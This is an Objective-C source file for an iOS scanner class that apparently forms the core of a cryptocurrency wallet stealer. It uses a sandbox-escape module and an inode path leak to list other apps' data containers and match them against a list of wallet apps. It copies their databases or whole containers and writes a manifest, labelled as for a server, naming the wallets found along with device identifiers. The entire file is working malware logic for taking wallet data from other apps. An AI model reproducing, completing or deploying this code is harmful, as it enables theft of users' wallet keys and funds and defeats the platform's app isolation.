#import "WQLScanner.h"
#import "WQLEscape.h"
#import "WQLPathLeak.h"
#import "WQLPathCache.h"
#import "WQLLog.h"
#import <UIKit/UIKit.h>
#import <stdlib.h>
#import <sys/sysctl.h>
#import <stdarg.h>
#import <sys/xattr.h>

static NSString * const kWQLContainerMeta = @".com.apple.mobile_container_manager.metadata.plist";

@interface WQLScanner ()
- (void)log:(NSString *)fmt, ...;
- (NSString *)bundleIDForContainerPath:(NSString *)path;
- (NSArray<NSString *> *)copyTarget:(WQLTarget *)t
                         container:(NSString *)container
                          bundleID:(NSString *)bundleID
                            outDir:(NSString *)outRoot
                             bytes:(uint64_t *)bytesOut;
- (NSArray<NSString *> *)sourcesForPath:(NSString *)path;
- (NSString *)relative:(NSString *)path fromContainer:(NSString *)container;
- (uint64_t)sizeOfItemAtPath:(NSString *)path;
- (NSString *)humanBytes:(uint64_t)b;
- (void)writeWalletManifestInDirectory:(NSString *)outDir
                               records:(NSArray<NSDictionary *> *)records;
- (NSArray<NSString *> *)copyWholeContainer:(NSString *)container
                                  forTarget:(WQLTarget *)t
                                   bundleID:(NSString *)bundleID
                                     outDir:(NSString *)outRoot
                                      bytes:(uint64_t *)bytesOut;
- (NSString *)productType;
- (NSArray<NSString *> *)listChildrenOfDirectory:(NSString *)dir error:(NSString **)error;
@end

@implementation WQLScanner

- (instancetype)init {
    if (self = [super init]) {
        _maxInode = 0;
        _maxContainerBytes = 800ULL * 1024 * 1024;
        _includeExtras = NO;
    }
    return self;
}

- (void)log:(NSString *)fmt, ... {
    va_list args;
    va_start(args, fmt);
    NSString *line = [[NSString alloc] initWithFormat:fmt arguments:args];
    va_end(args);
    WQLLogLine(@"%@", line);
    if (self.logBlock) self.logBlock(line);
}

- (NSArray<NSString *> *)defaultRoots {
    return @[
        @"/private/var/mobile/Containers/Data/Application",
        @"/private/var/mobile/Containers/Shared/AppGroup",
        @"/private/var/mobile/Containers/Data/InternalDaemon",
        @"/private/var/mobile/Containers/Data/PluginKitPlugin",
        @"/private/var/containers/Data/System",
        @"/private/var/containers/Shared/SystemGroup",
    ];
}

#pragma mark - 主流程

- (NSArray<NSDictionary<NSString *, id> *> *)scanWithOutputDirectory:(NSString *)outDir {
    NSFileManager *fm = [NSFileManager defaultManager];
    [fm createDirectoryAtPath:outDir withIntermediateDirectories:YES attributes:nil error:nil];

    NSMutableArray<WQLTarget *> *targets = [[WQLTargets wallets] mutableCopy];
    if (self.includeExtras) [targets addObjectsFromArray:[WQLTargets extras]];

    NSString *err = nil;
    if (![[WQLEscape shared] prepareWithError:&err]) {
        [self log:@"通道不可用: %@", err ?: @"unknown"];
        return @[];
    }
    NSDictionary *diag = [[WQLEscape shared] diagnostics];
    [self log:@"系统 %@ / group %@ / 容器 %@",
         diag[@"os"], diag[@"group"], diag[@"groupPath"]];

    NSArray<NSString *> *allRoots = [self defaultRoots];
    NSMutableDictionary<NSString *, NSArray<NSString *> *> *children = [NSMutableDictionary dictionary];
    NSMutableArray<NSString *> *needScan = [NSMutableArray array];

    for (NSString *root in allRoots) {
        NSString *fastErr = nil;
        NSArray<NSString *> *direct = [self listChildrenOfDirectory:root error:&fastErr];
        if (direct) {
            children[root] = direct;
            [self log:@"父目录豁免成功: %@ → %lu 项（跳过 inode 扫描）",
                  root, (unsigned long)direct.count];
            if (direct.count) {
                [[WQLPathCache shared] mergeScanned:@{ root: direct }];
            }
            continue;
        }

        NSArray<NSString *> *cached = [[WQLPathCache shared] validPathsForRoot:root];
        BOOL stale = [[WQLPathCache shared] needsRescanForRoot:root];
        if (cached.count && !stale) {
            children[root] = cached;
            [self log:@"%@ 命中缓存 %lu 项，跳过扫描", root, (unsigned long)cached.count];
        } else {
            if (cached.count) [self log:@"%@ 缓存已失效，重新扫描", root];
            [needScan addObject:root];
        }
    }

    if (!needScan.count) {
        [self log:@"全部命中缓存，跳过 inode 扫描"];
    } else {
        uint64_t maxInode = self.maxInode;
        if (maxInode == 0) {
            maxInode = [WQLPathLeak baselineInodeWithError:&err];
        }
        if (maxInode == 0) {
            [self log:@"取基线 inode 失败: %@（仅用缓存继续）", err ?: @"unknown"];
        } else {
            [self log:@"首次扫描 %lu 个根目录，inode 上界 %llu（较慢）",
                  (unsigned long)needScan.count, (unsigned long long)maxInode];

            __weak typeof(self) weakSelf = self;
            __block uint64_t lastPct = 0;
            BOOL completed = NO;
            NSDictionary<NSString *, NSArray<NSString *> *> *scanned =
                [WQLPathLeak childrenOfDirectories:needScan
                                          maxInode:maxInode
                                          progress:^(uint64_t done, uint64_t total) {
                __strong typeof(weakSelf) self = weakSelf;
                if (!self || total == 0) return;
                uint64_t pct = done * 100 / total;
                if (pct >= lastPct + 5) {
                    lastPct = pct;
                    [self log:@"枚举进度 %llu%%", (unsigned long long)pct];
                }
            } cancel:^BOOL{
                __strong typeof(weakSelf) self = weakSelf;
                return self ? (self.cancelBlock ? self.cancelBlock() : NO) : YES;
            } completed:&completed error:&err];

            if (scanned.count) {
                [children addEntriesFromDictionary:scanned];
                if (completed) {
                    [[WQLPathCache shared] mergeScanned:scanned];
                } else {
                    [self log:@"枚举被中断，本次结果不写入缓存"];
                }
            }
        }
    }

    NSMutableArray<NSDictionary *> *records = [NSMutableArray array];

    for (NSString *root in allRoots) {
        NSArray<NSString *> *items = children[root];
        if (!items.count) {
            [self log:@"%@ → 0 项", root];
            continue;
        }
        [self log:@"%@ → %lu 项", root, (unsigned long)items.count];

        for (NSString *path in items) {
            if (self.cancelBlock && self.cancelBlock()) break;

            NSString *escErr = nil;
            int64_t handle = [[WQLEscape shared] consumeExtensionForPath:path error:&escErr];
            NSString *bundleID = (handle > 0) ? [self bundleIDForContainerPath:path] : nil;
            BOOL fuzzy = NO;
            WQLTarget *t = [WQLTargets matchBundleID:bundleID inTargets:targets fuzzy:&fuzzy];

            NSMutableDictionary *record = [@{
                @"bundleId": bundleID ?: @"",
                @"path": path,
                @"target": t.name ?: @"",
                @"status": t ? @"matched" : @"skip",
                @"fuzzy": @(fuzzy),
                @"files": @[],
                @"bytes": @(0),
            } mutableCopy];
            [records addObject:record];

            if (fuzzy) {
                [self log:@"模糊命中: %@ → %@（采集前请确认不是同类无关 App）", bundleID, t.name];
            }

            if (handle <= 0) {
                record[@"status"] = [NSString stringWithFormat:@"escape_failed: %@",
                                     [[WQLEscape shared] describeStatus:handle]];
                [self log:@"%@ 取 extension 失败: %@", path, escErr ?: @""];
                continue;
            }

            if (!t) {
                [[WQLEscape shared] releaseHandle:handle];
                continue;
            }

            uint64_t bytes = 0;
            NSArray<NSString *> *files = [self copyTarget:t
                                             container:path
                                              bundleID:bundleID
                                                outDir:outDir
                                                 bytes:&bytes];

            if (files.count == 0 && !t.wholeContainer) {
                [self log:@"%@ (%@) 定点路径缺失，退化为整容器", t.name, bundleID];
                files = [self copyWholeContainer:path
                                       forTarget:t
                                        bundleID:bundleID
                                          outDir:outDir
                                           bytes:&bytes];
            }

            [[WQLEscape shared] releaseHandle:handle];

            record[@"files"] = files;
            record[@"bytes"] = @(bytes);
            record[@"status"] = files.count ? @"copied" : @"empty";
            [self log:@"%@ (%@) → %lu 个文件 / %@",
                  t.name, bundleID, (unsigned long)files.count,
                  [self humanBytes:bytes]];
        }
    }

    [self writeWalletManifestInDirectory:outDir records:records];

    NSData *json = [NSJSONSerialization dataWithJSONObject:records
                                                   options:NSJSONWritingPrettyPrinted
                                                     error:nil];
    if (json) {
        [json writeToFile:[outDir stringByAppendingPathComponent:@"manifest.json"] atomically:YES];
    }

    [self log:@"完成：%lu 个容器，命中 %lu 个目标",
          (unsigned long)records.count,
          (unsigned long)[[records filteredArrayUsingPredicate:
                           [NSPredicate predicateWithFormat:@"status IN %@",
                            @[@"copied", @"empty"]]] count]];
    return records;
}

#pragma mark - 父目录快路径

- (NSArray<NSString *> *)listChildrenOfDirectory:(NSString *)dir error:(NSString **)error {
    NSString *escErr = nil;
    int64_t handle = [[WQLEscape shared] consumeExtensionForPath:dir error:&escErr];
    if (handle <= 0) {
        if (error) *error = escErr ?: @"父目录豁免失败";
        return nil;
    }

    NSFileManager *fm = [NSFileManager defaultManager];
    NSError *e = nil;
    NSArray *items = [fm contentsOfDirectoryAtPath:dir error:&e];
    if (!items) {
        [[WQLEscape shared] releaseHandle:handle];
        if (error) *error = e.localizedDescription ?: @"列目录失败";
        return nil;
    }

    NSMutableArray<NSString *> *out = [NSMutableArray array];
    for (NSString *name in items) {
        if ([name hasPrefix:@"."]) continue;
        NSString *full = [dir stringByAppendingPathComponent:name];
        BOOL isDir = NO;
        if ([fm fileExistsAtPath:full isDirectory:&isDir] && isDir) {
            [out addObject:full];
        }
    }

    [[WQLEscape shared] releaseHandle:handle];
    return out;
}

#pragma mark - 容器识别

- (NSString *)bundleIDForContainerPath:(NSString *)path {
    NSString *meta = [path stringByAppendingPathComponent:kWQLContainerMeta];
    NSDictionary *d = [NSDictionary dictionaryWithContentsOfFile:meta];
    NSString *ident = d[@"MCMMetadataIdentifier"];
    if (ident.length) return ident;

    char buf[512] = {0};
    ssize_t n = getxattr(path.fileSystemRepresentation,
                         "com.apple.containermanager.identifier",
                         buf, sizeof(buf) - 1, 0, 0);
    if (n > 0) {
        buf[n] = 0;
        return [NSString stringWithUTF8String:buf];
    }
    return nil;
}

#pragma mark - 拷贝

- (NSArray<NSString *> *)copyTarget:(WQLTarget *)t
                         container:(NSString *)container
                          bundleID:(NSString *)bundleID
                            outDir:(NSString *)outRoot
                             bytes:(uint64_t *)bytesOut {
    NSFileManager *fm = [NSFileManager defaultManager];
    NSString *destRoot = [outRoot stringByAppendingPathComponent:bundleID];
    [fm createDirectoryAtPath:destRoot withIntermediateDirectories:YES attributes:nil error:nil];

    NSMutableArray<NSString *> *copied = [NSMutableArray array];
    uint64_t total = 0;

    if (t.wholeContainer) {
        uint64_t sz = [self sizeOfItemAtPath:container];
        if (sz > self.maxContainerBytes) {
            [self log:@"%@ 整容器 %@ 超过门限，跳过", t.name, [self humanBytes:sz]];
            return @[];
        }
        NSString *dst = [destRoot stringByAppendingPathComponent:@"container"];
        NSError *e = nil;
        if ([fm copyItemAtPath:container toPath:dst error:&e]) {
            [copied addObject:dst];
            total += sz;
        } else {
            [self log:@"%@ 整容器拷贝失败: %@", t.name, e.localizedDescription];
        }
    } else {
        for (NSString *rel in t.relativePaths) {
            NSString *src = [container stringByAppendingPathComponent:rel];
            if (![fm fileExistsAtPath:src]) continue;

            NSArray<NSString *> *sources = [self sourcesForPath:src];
            for (NSString *s in sources) {
                uint64_t sz = [self sizeOfItemAtPath:s];
                if (sz > self.maxContainerBytes) {
                    [self log:@"%@ 跳过超大文件 %@", t.name, s.lastPathComponent];
                    continue;
                }
                NSString *dstRel = [self relative:s fromContainer:container];
                NSString *dst = [destRoot stringByAppendingPathComponent:dstRel];
                [fm createDirectoryAtPath:[dst stringByDeletingLastPathComponent]
              withIntermediateDirectories:YES attributes:nil error:nil];
                [fm removeItemAtPath:dst error:nil];
                NSError *e = nil;
                if ([fm copyItemAtPath:s toPath:dst error:&e]) {
                    [copied addObject:dst];
                    total += sz;
                } else {
                    [self log:@"拷贝失败 %@: %@", s.lastPathComponent, e.localizedDescription];
                }
            }
        }
    }

    if (bytesOut) *bytesOut = total;
    return copied;
}

- (NSArray<NSString *> *)copyWholeContainer:(NSString *)container
                                  forTarget:(WQLTarget *)t
                                   bundleID:(NSString *)bundleID
                                     outDir:(NSString *)outRoot
                                      bytes:(uint64_t *)bytesOut {
    uint64_t sz = [self sizeOfItemAtPath:container];
    if (sz > self.maxContainerBytes) {
        [self log:@"%@ 整容器 %@ 超过门限，跳过", t.name, [self humanBytes:sz]];
        return @[];
    }

    NSFileManager *fm = [NSFileManager defaultManager];
    NSString *destRoot = [outRoot stringByAppendingPathComponent:bundleID ?: @"unknown"];
    [fm createDirectoryAtPath:destRoot withIntermediateDirectories:YES attributes:nil error:nil];
    NSString *dst = [destRoot stringByAppendingPathComponent:@"container"];

    NSError *e = nil;
    if (![fm copyItemAtPath:container toPath:dst error:&e]) {
        [self log:@"%@ 整容器兜底失败: %@", t.name, e.localizedDescription];
        return @[];
    }
    if (bytesOut) *bytesOut = sz;
    return @[dst];
}

- (NSArray<NSString *> *)sourcesForPath:(NSString *)path {
    NSFileManager *fm = [NSFileManager defaultManager];
    NSMutableArray *out = [NSMutableArray arrayWithObject:path];
    NSString *ext = path.pathExtension.lowercaseString;
    if ([ext isEqualToString:@"sqlite"] || [ext isEqualToString:@"sqlite3"] ||
        [ext isEqualToString:@"db"]) {
        for (NSString *suffix in @[@"-wal", @"-shm"]) {
            NSString *side = [path stringByAppendingString:suffix];
            if ([fm fileExistsAtPath:side]) [out addObject:side];
        }
    }
    return out;
}

- (NSString *)relative:(NSString *)path fromContainer:(NSString *)container {
    NSString *base = container;
    if (![base hasSuffix:@"/"]) base = [base stringByAppendingString:@"/"];
    if ([path hasPrefix:base]) return [path substringFromIndex:base.length];
    return path.lastPathComponent;
}

- (uint64_t)sizeOfItemAtPath:(NSString *)path {
    NSFileManager *fm = [NSFileManager defaultManager];
    BOOL isDir = NO;
    if (![fm fileExistsAtPath:path isDirectory:&isDir]) return 0;
    if (!isDir) {
        NSDictionary *a = [fm attributesOfItemAtPath:path error:nil];
        return [a[NSFileSize] unsignedLongLongValue];
    }
    uint64_t total = 0;
    NSDirectoryEnumerator *e = [fm enumeratorAtPath:path];
    while ([e nextObject]) {
        NSDictionary *a = [e fileAttributes];
        if (a[NSFileType] == NSFileTypeRegular) {
            total += [a[NSFileSize] unsignedLongLongValue];
        }
        if (total > self.maxContainerBytes) break;
    }
    return total;
}

#pragma mark - 服务端清单

- (void)writeWalletManifestInDirectory:(NSString *)outDir
                               records:(NSArray<NSDictionary *> *)records {
    NSMutableArray *found = [NSMutableArray array];
    NSMutableArray *wallets = [NSMutableArray array];

    for (NSDictionary *r in records) {
        NSString *name = r[@"target"];
        if (!name.length) continue;
        if (![found containsObject:name]) [found addObject:name];
        [wallets addObject:@{
            @"wallet": name,
            @"bundleID": r[@"bundleId"] ?: @"",
            @"bytes": r[@"bytes"] ?: @0,
        }];
    }

    NSString *idfv = [[UIDevice currentDevice] identifierForVendor].UUIDString;
    if (!idfv.length) {
        idfv = [[NSUserDefaults standardUserDefaults] stringForKey:@"WQLDeviceToken"];
        if (!idfv.length) {
            idfv = NSUUID.UUID.UUIDString;
            [[NSUserDefaults standardUserDefaults] setObject:idfv forKey:@"WQLDeviceToken"];
            [[NSUserDefaults standardUserDefaults] synchronize];
        }
    }

    UIDevice *dev = [UIDevice currentDevice];
    NSDictionary *man = @{
        @"deviceFolder": [NSString stringWithFormat:@"%@ iOS%@ %@",
                          dev.model, dev.systemVersion, idfv],
        @"ios": dev.systemVersion,
        @"productType": [self productType],
        @"found": found,
        @"wallets": wallets,
        @"source": @"WQLApp",
    };

    NSData *data = [NSJSONSerialization dataWithJSONObject:man
                                                   options:NSJSONWritingPrettyPrinted
                                                     error:nil];
    if (data) {
        NSString *p = [outDir stringByAppendingPathComponent:@"_manifest.json"];
        [data writeToFile:p atomically:YES];
        [self log:@"_manifest.json: found=%@", [found componentsJoinedByString:@","]];
    }
}

- (NSString *)productType {
    size_t size = 0;
    if (sysctlbyname("hw.machine", NULL, &size, NULL, 0) != 0 || size == 0) return @"iPhone";
    char *buf = malloc(size);
    if (!buf) return @"iPhone";
    NSString *model = @"iPhone";
    if (sysctlbyname("hw.machine", buf, &size, NULL, 0) == 0) {
        NSString *s = [NSString stringWithUTF8String:buf];
        if (s) model = s;
    }
    free(buf);
    return model;
}

- (NSString *)humanBytes:(uint64_t)b {
    if (b < 1024) return [NSString stringWithFormat:@"%llu B", (unsigned long long)b];
    if (b < 1024 * 1024) return [NSString stringWithFormat:@"%.1f KB", b / 1024.0];
    if (b < 1024ULL * 1024 * 1024) return [NSString stringWithFormat:@"%.1f MB", b / 1048576.0];
    return [NSString stringWithFormat:@"%.2f GB", b / 1073741824.0];
}

@end
